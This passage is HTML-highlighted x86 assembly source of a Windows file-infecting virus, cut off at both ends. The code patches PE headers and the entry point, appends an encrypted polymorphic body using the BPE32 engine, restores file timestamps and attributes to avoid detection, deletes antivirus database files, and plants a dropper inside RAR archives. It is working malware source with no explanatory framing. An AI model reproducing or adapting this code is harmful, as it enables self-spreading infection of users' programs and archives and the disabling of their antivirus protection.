    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;new VirtualSize, set WRITE bit</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header.SH_Characteristics.hiw.hib</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;now we will align some items</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_OptionalHeader.OH_FileAlignment</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;in PE header</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header.SH_SizeOfRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;new SizeOfRawData</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                                </span><span class="sc1">;new SizeOfImage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;ptr to last section header</span><span class="sc0">
</span><span class="sc5">sh_pos</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">                          </span><span class="sc1">;seek there</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;write modified section</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;header</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_something</span><span class="sc0">                    </span><span class="sc1">;...</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">                          </span><span class="sc1">;seek to MZ_res2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">;and write there</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;already infected</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bg_sig</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;mark</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_something</span><span class="sc0">                    </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;write there original</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;entrypoint also</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_something</span><span class="sc0">                    </span><span class="sc1">;...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MZlfanew</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;seek to PE header</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;get file size</span><span class="sc0">
</span><span class="sc5">fsize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header.SH_VirtualAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header.SH_PointerToRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                                </span><span class="sc1">;modify Entrypoint</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">5eh</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_something</span><span class="sc0">                    </span><span class="sc1">;write modified PE header</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_eof</span><span class="sc0">                           </span><span class="sc1">;seek to end of file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crypted_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;address of encrypted virus</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;ECX=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;CL=f_poly</span><span class="sc0">
</span><span class="sc5">f_poly</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                         </span><span class="sc1">;poly-engine ran once ?</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_poly</span><span class="sc0">                          </span><span class="sc1">;yeah, copy virus only</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;get start of virus in memory</span><span class="sc0">
</span><span class="sc5">mem_addr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6c0h</span><span class="sc0">                           </span><span class="sc1">;aproximated size of virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BPE32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">f_poly</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;set poly semaphore</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">do_RAR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;enable RAR infection</span><span class="sc0">
</span><span class="sc5">end_poly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">                          </span><span class="sc1">;8192 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;where?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_something</span><span class="sc0">                    </span><span class="sc1">;write 8192 bytes of virus</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;to file and quit</span><span class="sc0">

</span><span class="sc5">end_cc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all registers</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">                                      
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                             </span><span class="sc1">;close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7143h</span><span class="sc0">                          </span><span class="sc1">;LFN set file time/date</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">targetname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;original time</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;original date</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;set it back</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7143h</span><span class="sc0">                          </span><span class="sc1">;LFN set file attributes</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;original file attributes</span><span class="sc0">
</span><span class="sc5">file_attr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;set it back</span><span class="sc0">

</span><span class="sc1">;now we will delete some AV databases</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ShItTyFiLeZ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;start of file names</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">;number of them</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">DeLiT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;save count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                          </span><span class="sc1">;set file attributes</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;blank them</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                             </span><span class="sc1">;and delete file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;restore count</span><span class="sc0">
</span><span class="sc5">end_sz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;get</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                             </span><span class="sc1">;end of</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_sz</span><span class="sc0">                              </span><span class="sc1">;string</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DeLiT</span><span class="sc0">                              </span><span class="sc1">;delete files in a loop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">                      </span><span class="sc1">;and exit</span><span class="sc0">

</span><span class="sc5">try_RAR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_state</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">BG_INFECTINRAR</span><span class="sc0"> </span><span class="sc1">;set v_state</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;ECX=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;CL=do_RAR</span><span class="sc0">
</span><span class="sc5">do_RAR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                         </span><span class="sc1">;before infectin RAR we must</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                        </span><span class="sc1">;infect at least one EXE</span><span class="sc0">
                                                </span><span class="sc1">;to initialize poly</span><span class="sc0">
</span><span class="sc1">;now we will check, if last file in RAR has our name. If has, RAR is already</span><span class="sc0">
</span><span class="sc1">;infected and we wont infect it again.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_eof</span><span class="sc0">                           </span><span class="sc1">;go to the end of file</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">3000h</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">;go to the EOF-3000h-8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">                          </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmpname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;read 8 bytes from that</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;location to temporary buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r_something</span><span class="sc0">                        </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">;compare 8 bytes of filename</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">n_cmp2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmpsd</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">inf_RAR</span><span class="sc0">                             </span><span class="sc1">;not match, we can infect it</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">n_cmp2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;RAR already infected, quit</span><span class="sc0">

</span><span class="sc5">inf_RAR</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_eof</span><span class="sc0">                           </span><span class="sc1">;got to the end of file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">d1start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get start of dropper part 1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virus_in_arc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;destination</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;save it for l8r use</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1size</span><span class="sc0">                         </span><span class="sc1">;how many bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy dropper part 1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crypted_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get start of encrypted virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">                          </span><span class="sc1">;8192 bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy virus</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">d2start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get start of dropper part 2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d2size</span><span class="sc0">                         </span><span class="sc1">;how many bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy dropper part 2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;get address of dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">                          </span><span class="sc1">;size of dropper</span><span class="sc0">
